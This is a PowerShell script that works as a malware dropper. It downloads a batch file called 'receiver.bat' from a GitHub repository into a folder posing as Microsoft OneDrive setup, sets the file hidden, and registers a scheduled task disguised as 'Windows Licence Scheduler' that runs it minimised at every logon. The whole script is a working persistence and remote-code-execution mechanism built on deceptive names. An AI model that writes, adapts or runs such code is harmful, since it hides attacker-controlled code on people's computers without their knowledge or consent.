try {
    # Download the batch file
    Invoke-WebRequest -Uri 'https://github.com/RaupenInspektor/pico/raw/main/receiver.bat' -OutFile 'C:\ProgramData\Microsoft OneDrive\setup\receiver.bat'
    Write-Host "Download completed."
} catch {
    Write-Error "Failed to download file: $_"
}

try {
    # Hide the batch file if it exists
    if (Test-Path 'C:\ProgramData\Microsoft OneDrive\setup\receiver.bat') {
        Set-ItemProperty -Path 'C:\ProgramData\Microsoft OneDrive\setup\receiver.bat' -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
        Write-Host "File hidden."
    } else {
        Write-Error "File not found."
    }
} catch {
    Write-Error "Failed to hide the file: $_"
}

try {
    # Create the scheduled task action
    $action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c start /min """" ""C:\ProgramData\Microsoft OneDrive\setup\receiver.bat"""
    Write-Host "Scheduled task action created."
} catch {
    Write-Error "Failed to create scheduled task action: $_"
}

try {
    # Create the scheduled task trigger
    $trigger = New-ScheduledTaskTrigger -AtLogon
    Write-Host "Scheduled task trigger created."
} catch {
    Write-Error "Failed to create scheduled task trigger: $_"
}

try {
    # Create the scheduled task principal
    $principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive -RunLevel Limited
    Write-Host "Scheduled task principal created."
} catch {
    Write-Error "Failed to create scheduled task principal: $_"
}

try {
    # Create the scheduled task settings
    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
    Write-Host "Scheduled task settings created."
} catch {
    Write-Error "Failed to create scheduled task settings: $_"
}

try {
    # Register the scheduled task with the name "Windows Licence Scheduler"
    Register-ScheduledTask -TaskName "Windows Licence Scheduler" -Action $action -Trigger $trigger -Principal $principal -Settings $settings
    Write-Host "Scheduled task registered."
} catch {
    Write-Error "Failed to register scheduled task: $_"
}
